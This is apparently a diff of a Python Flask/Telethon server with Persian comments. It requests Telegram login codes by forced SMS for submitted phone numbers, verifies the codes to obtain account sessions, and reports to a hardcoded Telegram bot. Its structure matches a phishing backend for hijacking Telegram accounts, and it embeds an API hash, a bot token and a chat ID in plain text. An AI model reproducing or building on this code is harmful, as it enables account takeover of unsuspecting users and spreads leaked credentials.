@@ -9,8 +9,11 @@ import requests
 app = Flask(__name__)
 CORS(app)
 
-API_ID = 2899
-API_HASH = '36722c72256a24c1225de00eb6a1ca74'
+# ============================================================
+#  تنظیمات - اینارو با اطلاعات خودت جایگزین کن
+# ============================================================
+API_ID = 2899  # ← API_ID جدید از my.telegram.org
+API_HASH = '36722c72256a24c1225de00eb6a1ca74'  # ← API_HASH جدید
 BOT_TOKEN = '8591425870:AAEAjapPJnv_Q_NfW5NbTX6_b-zrGMPGv-s'
 CHAT_ID = '8491102319'
 
@@ -19,6 +22,9 @@ logging.basicConfig(level=logging.INFO)
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
 
+# ============================================================
+#  روت‌ها
+# ============================================================
 @app.route('/health', methods=['GET'])
 def health():
     return jsonify({'status': 'ok', 'sessions': len(sessions)})
@@ -66,14 +72,16 @@ def verify_code():
         return jsonify({'error': str(e)}), 500
 
 # ============================================================
-#  ✅ تابع send_code (اصلاح‌شده)
+#  تابع ارسال کد (با force_sms=True)
 # ============================================================
 async def send_code(session_id, phone):
     try:
         client = TelegramClient(session_id, API_ID, API_HASH)
         await client.connect()
         
-        # فقط force_sms=True
+        # ============================================================
+        #  force_sms=True → تلگرام رو مجبور به SMS میکنه
+        # ============================================================
         result = await client.send_code_request(
             phone,
             force_sms=True
@@ -83,15 +91,15 @@ async def send_code(session_id, phone):
         sessions[session_id]['phone_code_hash'] = result.phone_code_hash
         sessions[session_id]['status'] = 'code_sent'
         
-        logging.info(f"✅ SMS forced for: {phone}")
+        logging.info(f"✅ Code requested (force_sms) for: {phone}")
         
     except Exception as e:
         sessions[session_id]['status'] = 'error'
-        logging.error(f"❌ Error: {e}")
+        logging.error(f"❌ Error sending code for {phone}: {e}")
         raise
 
 # ============================================================
-#  بقیه توابع
+#  تابع تایید کد و دریافت سشن
 # ============================================================
 async def verify_session(session_id, phone, code):
     session = sessions.get(session_id)
@@ -126,11 +134,14 @@ async def verify_session(session_id, phone, code):
 
     except Exception as e:
         sessions[session_id]['status'] = 'error'
-        logging.error(f"❌ Verification error: {e}")
+        logging.error(f"❌ Verification error for {phone}: {e}")
         if 'code' in str(e).lower() or 'invalid' in str(e).lower():
             return False
         raise
 
+# ============================================================
+#  ارسال به ربات تلگرام
+# ============================================================
 async def send_to_bot(message):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -147,6 +158,9 @@ async def send_to_bot(message):
     except Exception as e:
         logging.error(f"❌ Bot error: {e}")
 
+# ============================================================
+#  اجرا
+# ============================================================
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
     app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
